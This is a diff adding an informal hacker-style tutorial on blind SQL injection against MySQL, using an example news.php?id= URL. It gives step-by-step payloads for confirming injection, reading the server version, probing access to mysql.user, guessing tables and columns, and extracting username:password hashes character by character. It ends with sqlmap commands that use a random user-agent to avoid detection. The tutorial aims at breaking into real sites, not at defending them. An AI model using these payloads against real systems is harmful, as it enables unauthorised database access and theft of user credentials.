@@ -1,0 +1,99 @@
+i haven't written a sql tut in awhile so ill add a blind injection tutorial for mysql, the same idea will work in ms-sql with similar commands. Blind injection is a little more complicated/time consuming, but when your injection is multi-select and union isn't possible this is your next best bet. I will go over how to pull version, how to guess table and column names, and finally how to actually pull column data out of the database.
+
+Do not try to use a comment (ie: --, or /*) when doing blind injection, its not needed and may makes things worse. There are automating tools for blind injections, I like knowing how blind attacks work so i can do things by hand when needed. I personally use a combination of doing blind injections by hand and by using automating tools to pull the actual content from a column. Pulling data from mysql using blind attack is slow, even when using automating tools, but when no other option is available its still a useful method for sites you really want ;)
+
+
+I will be using an example url http://site.com/news.php?id=12
+
+when we visit the url we see a news article with a title of and the article content. We test the injection is subject to a blind attack by going to
+
+news.php?id=12 and 1=1
+we should see the same url and contents, then try going to 
+
+news.php?id=12 and 1=2
+on a successful injection you will see content missing, could be as obvious as the title/article missing or as obscure as maybe the number of pages of the article disappearing. You may have to hit back and forward on your browser to look for differences. If our injection was on a string variable instead of doing news.php?id=12 and 1=1 / news.php?id=12 and 1=2 we would be doing news.php?id=12' and 1='1 / news.php?id=12' and 1='2 this is to keep the syntax error less.
+
+For our example lets say just say the title/content of the article disappears when we did 1=2 but was still there when we did 1=1. we can see our input is affecting the mysql returned data. no data is going to match 1=2 so nothing is returned, when the statement is true the content normally being returned from the rest of the sql statement gets returned. So we now string together questions in true/false methods and when the content is displayed on the page we know the question was true, and when its not its false. I will refer to 'page loading normally' as the content is being returned from the mysql database and the statement is TRUE.
+
+--Getting mysql @@VERSION--
+
+The first question i usually ask is for the version number of mysql, it helps knowing what commands are available as different mysql have different options available.
+
+news.php?id=12 and substring(@@version,1,1)=4
+what i did here was get the first character of @@version and compare it to =4, if its TRUE statement we should see the news article otherwise the page will be missing content as like we did 1=2. The page is missing content so i change the 4 to a 5 and try again, this time the page loads normally with the content there so we know were dealing with Mysql5. if 4 and 5 don't work, try 3. If its mysql3 its nearly impossible to get any data out since subselects and union isn't possible making these further commands useless.
+
+--Check if we have access to mysql.user--
+
+Next i just want to test subselects, sometimes the word "select" is blacklisted.
+
+news.php?id=12 and (select 1)=1
+if subselects work you should see the page load normally. Next i want to see if we are an elevated user that has access to mysql.user.
+
+news.php?id=12 and (SELECT 1 from mysql.user limit 0,1)=1
+If we have access to mysql.user the query will return 1, if we dont it will error and not return anything. So if the page loads normally here we have access to mysql.user and may be useful to pull mysql hashes later on or try using load_file() and OUTFILE. Also note i used 'limit 0,1', subselects can only return 1 row of data or they will error and fail so don't forget it.
+
+--Checking for valid tables--
+
+In our example we have mysql5, but pulling data from information_schema is slow in a blind attack so might want to just try guessing a few tables. Or you may be using mysql4 and be required to guess tables/column to get any further.
+
+news.php?id=12 and (SELECT 1 from users limit 0,1)=1
+I tried guessing for table users, if there is a table called users it will load normally. Just change the table to guess table names.
+
+--Checking for column names within a found table--
+
+If you got lucky and guessed some good table names we now can try guessing some columns within those tables. users table has already been found using the above method, dont skip to this step unless you found your tables already.
+
+news.php?id=12 and (SELECT substring(concat(1,password),1,1) from users limit 0,1)=1
+What i did here was merge '1' with the column password, then using substring cut it back down to just the first character which should be 1 if the column password exists. Change the column password to others to try to guess other column names.
+
+--Pulling data from found table/columns--
+
+Ok this is the actual part of pulling data from those tables and this is were it becomes time consuming, I use automating tools on this part but knowing how to do it by hand makes you a better sql'er =) I'm going to pull username,password column from the table users. I already found username,password,email,userid to be valid columns within the table using the above method.
+
+news.php?id=12 and ascii(substring((SELECT concat(username,0x3a,password) from users where userid=2),1,1))>100
+ok what i did here was first pull the username/password i want using a where clause, otherwise you could do limit 0,1 to pull the first user out, subselects are limited to 1 row if your subselect will return more then 1 row it will error and this will fail. So its not a bad idea to stick limit 0,1 at the end if your not sure how many rows are going to be returned. then outside of my subselect i have substring(,1,1) this trims my subselect down to just the first character, 1 character in length. Then the ascii() converts that 1 character to an ascii numeric value where i compare it using the greater then symbol > 100.
+
+So in the above example, if the ascii char was greater then 100 the page will load normally. In our case the page doesn't load with the content so we know the first char is less then 100, we guess again.
+
+news.php?id=12 and ascii(substring((SELECT concat(username,0x3a,password) from users where userid=2),1,1))>80
+page loads normally with >80, true. We go higher.
+
+news.php?id=12 and ascii(substring((SELECT concat(username,0x3a,password) from users where userid=2),1,1))>90
+false, lower
+
+news.php?id=12 and ascii(substring((SELECT concat(username,0x3a,password) from users where userid=2),1,1))>85
+true, higher
+
+news.php?id=12 and ascii(substring((SELECT concat(username,0x3a,password) from users where userid=2),1,1))>86
+false. We now narrowed it down to be greater then 85 but not greater then 86. So we know our number is 86! You can test by doing =86 if you want to be sure, it may be confusing at first. Using an ascii converter we knows char(86) is 'V', so the first letter of our returned row is 'V', exciting lol. To get the next character we modify the substring.
+
+news.php?id=12 and ascii(substring((SELECT concat(username,0x3a,password) from users where userid=2),2,1))>100
+I changed the substring ,1,1 to a ,2,1. now it returns the 2nd character of the subselect, 1 character in length. we do the same thing again as the first char. This time >100 returned true so we raise the number.
+
+news.php?id=12 and ascii(substring((SELECT concat(username,0x3a,password) from users where userid=2),2,1))>120
+false, lower the 120
+
+news.php?id=12 and ascii(substring((SELECT concat(username,0x3a,password) from users where userid=2),2,1))>110
+false, lower
+
+news.php?id=12 and ascii(substring((SELECT concat(username,0x3a,password) from users where userid=2),2,1))>105
+false,lower
+
+news.php?id=12 and ascii(substring((SELECT concat(username,0x3a,password) from users where userid=2),2,1))>103
+true, higher
+
+news.php?id=12 and ascii(substring((SELECT concat(username,0x3a,password) from users where userid=2),2,1))>104
+true, we see that its greater then 104 and NOT greater then 105 making the number we want 105. char(105) is 'i'. So we have 'Vi' so far. As you can see we did 11 requests and only got 2 characters from the database, i actually guessed the number pretty fast it may take a lot more to narrow it down. See how pulling user/password hash can be time consuming. Keep incrementing the substring until you get to the end where >0 will return false.
+
+--Automating the pulling of data--
+
+I use sqlmap .4, .5 has a few bugs and doesnt always work correctly for me. There are other tools made for blind injection as well. To pull the same username and password in sqlmap you use this command.
+=============================================
+./sqlmap.py -u "http://site.com/news.php?id=12" -p id -a "./txt/user-agents.txt" -v1 --string "Posted 3-3-2008" -e "(SELECT concat(username,0x3a,password) from users where userid=2)"
+-u is the url your going to inject, -p is the peramiter that is injectable, id. -a will pull a random user-agent from a text otherwise itll use the default sqlmap user-agent, not a good idea. -v1 is verbose. --string is the unique string that appears when the command is TRUE, you find this by doing 1=1 and 1=2 and pasting a small bit of text that only shows when its TRUE. -e is the command you want to evaluate, we want to do a subselect so be sure to add ( ) around your SELECT statement.
+
+Doing the above sqlmap command may take 5mins or so to finesh, but beats 30mins or so it would take to do by hand. sqlmap can also get tables/columns if your accessing mysql5, but do you really need the complete table structer. Use -e to do your own commands to only get tables/columns of interest. If your using mysql4 you have to guess tables/columns using the method described earlier.
+
+./sqlmap.py -u "http://site.com/news.php?id=12" -p id -a "./txt/user-agents.txt" -v1 --string "Posted 3-3-2008" -e "(SELECT concat(table_schema,0x3a,table_name,0x3a,column_name) from information_schema.columns where column_name like 0x257061737325 limit 0,1)"
+sqlmap doesn't like handing quotes even if your injection has magicquotes off, so hex. 0x257061737325 is '%pass%' hexed. Now we just run this and increment our limit to get next rows. much faster then using sqlmap to get ALL tables and then trying to figure what tables have what we may be looking for.
+============================================
